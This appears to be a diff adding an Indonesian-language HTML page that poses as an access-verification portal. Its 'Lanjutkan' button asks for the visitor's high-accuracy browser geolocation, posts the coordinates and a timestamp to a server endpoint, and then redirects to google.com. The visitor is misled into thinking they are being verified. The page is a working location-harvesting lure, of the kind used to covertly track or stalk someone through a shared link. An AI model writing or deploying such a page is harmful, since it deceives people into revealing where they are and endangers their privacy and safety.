@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal Verifikasi / Informasi</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            text-align: center;
+            padding: 50px;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            margin: auto;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Verifikasi Akses</h2>
+        <p>Silakan klik tombol di bawah untuk melanjutkan ke halaman utama.</p>
+        <button onclick="getLocation()">Lanjutkan</button>
+        <p id="status" style="margin-top: 15px; color: #666; font-size: 14px;"></p>
+    </div>
+
+    <script>
+        function getLocation() {
+            const statusText = document.getElementById('status');
+            if (navigator.geolocation) {
+                statusText.innerText = "Memuat data...";
+                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                statusText.innerText = "Browser tidak mendukung Geolocation.";
+            }
+        }
+
+        function sendPosition(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString()
+            };
+
+            fetch('/api/save-location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(res => res.json())
+            .then(response => {
+                document.getElementById('status').innerText = "Berhasil! Mengalihkan...";
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com"; // Redirect setelah sukses
+                }, 1000);
+            })
+            .catch(err => {
+                console.error("Gagal mengirim:", err);
+            });
+        }
+
+        function showError(error) {
+            const statusText = document.getElementById('status');
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    statusText.innerText = "Akses lokasi ditolak oleh pengguna.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    statusText.innerText = "Informasi lokasi tidak tersedia.";
+                    break;
+                case error.TIMEOUT:
+                    statusText.innerText = "Waktu permintaan habis.";
+                    break;
+                default:
+                    statusText.innerText = "Terjadi kesalahan yang tidak diketahui.";
+                    break;
+            }
+        }
+    </script>
+
+</body>
+</html>
